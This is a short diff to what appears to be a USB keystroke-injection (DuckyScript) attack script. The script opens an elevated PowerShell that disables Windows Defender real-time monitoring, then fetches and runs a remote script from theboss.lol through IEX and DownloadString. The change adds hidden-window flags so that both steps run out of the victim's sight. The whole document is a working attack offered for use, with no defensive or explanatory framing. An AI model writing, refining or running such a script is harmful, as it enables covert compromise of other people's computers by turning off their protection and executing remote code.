@@ -4,7 +4,7 @@ DELAY 1000
 GUI r
 DELAY 200
 REM Start an elevated powershell instance which will disable Windows Defender.
-STRING powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+STRING powershell -w hidden start powershell  -w hidden -A 'Set-MpPreference -DisableRea $true' -V runAs
 ENTER
 DELAY 1000
 REM if you need administrator [left, enter and delay 1000]
@@ -15,7 +15,7 @@ ALT y
 DELAY 1000
 GUI r
 DELAY 100
-STRING powershell "IEX (New-Object Net.WebClient).DownloadString('http://theboss.lol/payload.ps1');"
+STRING powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://theboss.lol/payload.ps1');"
 ENTER
 STRING exit
 ENTER
